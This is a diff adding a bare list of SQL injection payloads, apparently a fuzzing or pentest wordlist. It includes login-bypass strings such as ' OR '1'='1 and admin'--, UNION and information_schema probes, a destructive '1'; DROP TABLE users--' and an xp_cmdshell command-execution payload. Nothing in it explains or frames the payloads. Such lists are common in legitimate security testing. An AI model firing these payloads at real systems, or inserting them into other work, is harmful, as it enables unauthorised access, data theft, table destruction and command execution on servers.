@@ -1,0 +1,18 @@
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin'#
+admin'/*
+' OR 'x'='x
+' OR 'a'='a
+') OR ('1'='1
+') OR (1=1)--
+1' OR '1'='1
+1 OR 1=1
+1' UNION SELECT NULL--
+1' UNION SELECT 1,2,3--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1'; DROP TABLE users--
+1'; EXEC xp_cmdshell('dir')--
